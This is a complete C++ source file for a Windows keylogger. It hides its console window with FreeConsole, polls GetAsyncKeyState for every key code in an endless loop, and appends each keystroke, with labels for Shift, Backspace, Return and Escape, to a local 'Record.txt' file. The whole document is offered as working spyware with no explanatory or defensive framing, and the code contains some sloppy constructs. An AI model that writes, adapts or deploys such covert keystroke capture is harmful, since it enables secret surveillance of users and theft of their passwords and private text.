#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

int Save(int key, char *file);

int main()
{
    FreeConsole();

    char i;

    while(true)
    {
        Sleep(10);

        for(i=8;i<=255;i++)
        {
            if(GetAsyncKeyState(i)==-32767)
            {
                Save(i, "Record.txt");
            }
        }
    }

    return 0;
}

int Save(int key, char *file)
{
    cout<<key<<endl;

    Sleep(10);

    FILE *OUTPUT_FILE;

    OUTPUT_FILE=fopen(file, "a+");

    if(key==VK_SHIFT)
    {
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    }
    else if(key==VK_BACK)
    {
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
    }
    else if(key==VK_LBUTTON)
    {
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    }
    else if(key==VK_RETURN)
    {
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    }
    else if(key==VK_ESCAPE)
    {
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    }
    else
    {
        fprintf(OUTPUT_FILE,"%s",&key);
    }

    fclose(OUTPUT_FILE);

    return 0;
}
